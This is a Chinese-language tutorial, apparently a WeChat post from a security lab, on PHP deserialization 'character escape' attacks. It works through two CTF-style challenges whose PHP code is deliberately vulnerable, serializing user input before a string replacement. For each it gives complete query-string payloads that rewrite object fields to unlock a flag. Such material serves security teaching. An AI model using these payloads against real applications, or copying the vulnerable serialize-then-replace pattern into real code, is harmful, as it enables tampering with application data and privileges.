---
title: PHP反序列化之字符逃逸
url: https://mp.weixin.qq.com/s/ZgJXp7wzO1ssB9PeEmtsPQ
source: Doonsec's feed
date: 2026-03-27
fetch_date: 2026-03-28T04:17:30.652848
---

# PHP反序列化之字符逃逸

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/9gzvfnvOl3S2KS1hSQoQ9ROsjRsnGMfExFMHZ1WeezEo5KgozIPPEdwO5ITicymFRyejVNbKm6cvHZaiadkQkMI4RicuCicterMdtj2gL4pwSlA/0?wx_fmt=jpeg)

# PHP反序列化之字符逃逸

原创

Siskin
Siskin

源鲁安全实验室

![]()

在小说阅读器中沉浸阅读

字符逃逸是PHP反序列化中一种仅利用序列化字符串替换操作实现字段篡改的攻击手法。本文将从序列化引擎的解析机制出发，深度分析原理及利用方法。

**前置知识**

在分析字符逃逸之前，需要先理解PHP序列化引擎的三个关键解析行为。

**解析以长度为准**

PHP反序列化引擎以 ; 分隔字段，以 } 标记结构结尾，在解析字符串时，会严格按照 s:n 中声明的长度 n 读取字符。在读取范围内的 "、;、}  等符号仅作为普通文本处理，不会触发提前截断。

```
<?php
$raw = 's:6:"ad";in";';
var_dump(unserialize($raw));
// 输出结果：
// string(6) "ad";in"
?>
```

引擎按 s:6 读取6个字符 ad";in ，中间的 "; 并没有导致截断。长度字段是唯一的定位依据，这意味着如果声明的字段长度与实际内容长度不符，就会把原本不属于该字段的内容"吞入"或"吐出"。

**结构完整即停止**

PHP反序列化引擎成功解析出一个完整的数据结构后，会立即停止解析并忽略闭合符号}之后的所有多余字符。

```
<?php
$raw = 'a:1:{s:4:"user";s:5:"admin";}s:4:"role";s:5:"super";}';
var_dump(unserialize($raw));
// 输出结果：
//array(1) {
//  ["user"]=>
//  string(5) "admin"
//}
?>
```

代码声明了 a:1 只有一个元素，解析完后遇到闭合符号 } ，结构正常闭合，闭合符号 } 之后的内容全部被忽略。

**支持动态属性**

PHP反序列化时，支持对类中未定义的属性进行解析，会自动为对象创建该属性并完成赋值。

```
<?php
class User {
    public $name = 'guest';
}
$raw = 'O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"super";}';
var_dump(unserialize($raw));
// 输出结果:
//object(User)#1 (2) {
//  ["name"]=>
//  string(5) "admin"
//  ["role"]=>
//  string(5) "super"
//}
?>
```

User 类中只定义了 name，但序列化字符串中注入了一个未定义的 role 属性，执行反序列化后对象自动拥有了 role 属性并被赋值为 super。

**漏洞原理**

字符逃逸漏洞产生的根源在于：代码对用户可控输入先调用 serialize() 完成序列化，再对序列化结果执行 str\_replace() 等字符替换操作，最后才执行反序列化。 serialize () 会在序列化时写入字符串长度值 n，但后续的替换操作改变了字符串的实际长度，却没有同步更新 n 值。这个"长度与内容的不一致"，就是可以利用的突破口。

**利用方法**

当替换操作改变了字符的数量时就会出现以下两种情况：

**情况一：替换后字符增多**

引擎按原始的 `n`去读取，但实际字符比 `n`多，多出来的字符会被「挤出」当前字段，被引擎当作后续的序列化结构解析。

```
<?php
highlight_file(__FILE__);
error_reporting(0);
function sanitize($str){
    $blacklist = array("exp");
    $str = str_replace($blacklist, "cool", $str);
    return$str;
}
class Profile{
    var $nickname;
    var $motto = 'hello';
    function __construct($nickname){
        $this->nickname = $nickname;
    }
}
$input = $_GET['nickname'];
$data  = serialize(new Profile($input));
$obj   = unserialize(sanitize($data));
if ($obj->motto == 'getflag'){
    echo file_get_contents("flag.php");
}
?>
```

通过查看代码可以知道，需要满足$obj->motto == 'getflag' 才能得到flag，此题中我们只能控制 nickname 参数，同时sanitize函数会将我们传入字符中的"exp"替换成"cool"。

把代码放到本地进行调试，首先传入?nickname=123观察下正常的序列化字符串，得到以下输出：

```
O:7:"Profile":2:{s:8:"nickname";s:3:"123";s:5:"motto";s:5:"hello";}
```

我们的核心思路是：在可控的 `nickname`中同时放入用于制造字符膨胀的 "`exp"`字符，以及我们想要执行的恶意序列化结构，利用替换后字符增多但序列化字符串记录的长度 n 不变这一核心矛盾点，让输入的这段恶意结构被挤出 `nickname`的值范围，成为引擎要解析的新 `motto`字段，而原本的 `motto`字段被挤到有效解析结构之外，被引擎直接忽略。

```
";s:5:"motto";s:7:"getflag";}
```

传入构造的内容，得到序列化字符串如下：

```
O:7:"Profile":2:{s:8:"nickname";s:29:"";s:5:"motto";s:7:"getflag";}";s:5:"motto";s:5:"hello";}
```

我们刚才构造的内容的字符长度是29，由于单次"`exp"`替换为"`cool"`仅能让字符数增加 1 个，要让这段 29 字符的结构完全被挤出 `n``ickname`的长度读取范围，需要进行 29 次替换，也就是 29 个连续的"`e``xp"`。由此构造payload如下：

```
?nickname=expexpexpexpexpexpexpexpexpexpexpexpexpexpexpexpexpexpexpexpexpexpexpexpexpexpexpexpexp";s:5:"motto";s:7:"getflag";}
```

**情况二：替换后字符减少**

引擎按原始的 `n`去读取，但实际字符比 `n`少，引擎会向后越界「吞入」，把原本属于后续结构的字符读进当前字段的值中。

下面我们通过具体示例，拆解"字符减少"场景的完整利用过程。

```
<?php
highlight_file(__FILE__);
error_reporting(0);
function sanitize($str){
    $blacklist = array("test");
    $str = str_replace($blacklist, "no", $str);
    return$str;
}
class Account{
    var $uid;
    var $key;
    var $isVip = false;
    function __construct($uid, $key){
        $this->uid = $uid;
        $this->key = $key;
    }
}
$uid = $_GET['uid'];
$key = $_GET['key'];
$data = serialize(new Account($uid, $key));
$obj  = unserialize(sanitize($data));
if ($obj->isVip){
    echo file_get_contents("flag.php");
}
?>
```

这个题的目标是满足 $obj->isVip == true。

同样是在本地运行，传入uid=bob&key=123，然后观察一下正常的序列化字符串，得到如下序列化字符串：

```
O:7:"Account":3:{s:3:"uid";s:3:"bob";s:3:"key";s:3:"123";s:5:"isVip";b:0;}
```

在字符减少型逃逸中，利用逻辑与增多型不同：我们无法向后 “挤出” 新的结构空间，而是要利用 **“替换后字符变少但序列化长度声明不变”** 的核心矛盾，让反序列化引擎向后越界 “吞入” 原本属于后续结构的字符，从而打乱原有的解析顺序。

结合引擎特性，我们在可控的`key`参数中提前构造如下序列化片段，用于篡改`isVip`的值为`true`并提前闭合对象：

```
";s:3:"key";s:3:"123";s:5:"isVip";b:1;}
```

将 uid 参数置空，传入 key 参数得到如下序列化字符串

```
O:7:"Account":3:{s:3:"uid";s:0:"";s:3:"key";s:39:"";s:3:"key";s:3:"123";s:5:"isVip";b:1;}";s:5:"isVip";b:0;}
```

我们需要利用引擎特性使";s:3:"key";s:39:"作为 uid 参数的一部分，使我们构造的后续内容逃逸出来。

";s:3:"key";s:39:"一共 18 字符，一个"test"被替换成一个"no"，会逃逸出两个字符，所以一共需要 9 个"test"。

由此构造payload如下：

```
?uid=testtesttesttesttesttesttesttesttest&key=";s:3:"key";s:3:"123";s:5:"isVip";b:1;}
```

**总结**

`serialize()` 在替换之前记录了字符串长度 n ，`str_replace()` 在之后改变了实际字符数量，但 n 没有更新。通过精确计算这个差值，让反序列化引擎在读取n个字符时，要么把恶意代码**挤出**字符串边界成为新字段（增多型），要么让引擎**越界吞噬**原有结构、用注入内容**替代**原字段（减少型）。最终结合完整数据结构中闭合符号 `}`之后内容会被丢弃的特性，实现字段的篡改。

![](https://mmbiz.qpic.cn/mmbiz_png/9gzvfnvOl3QaTDf6ibibPrX1raXoatTFCSyg5sfGGdX7kNlvTGiboVMuVRJS545wNg6N9ibzDe38cuJyF5U6icvZ0ViaafkM4mGDITIA4SswBfA6E/640?wx_fmt=png&from=appmsg)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoCSVgeWAucKFtsdFJFibnoFHewv4aU7yrjQqdbxBODylRAIYhwoiczr7Os19jttfJmSicL3noECiaAYOA/0?wx_fmt=png)

源鲁安全实验室

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/BSbU8iceXVoCSVgeWAucKFtsdFJFibnoFHewv4aU7yrjQqdbxBODylRAIYhwoiczr7Os19jttfJmSicL3noECiaAYOA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过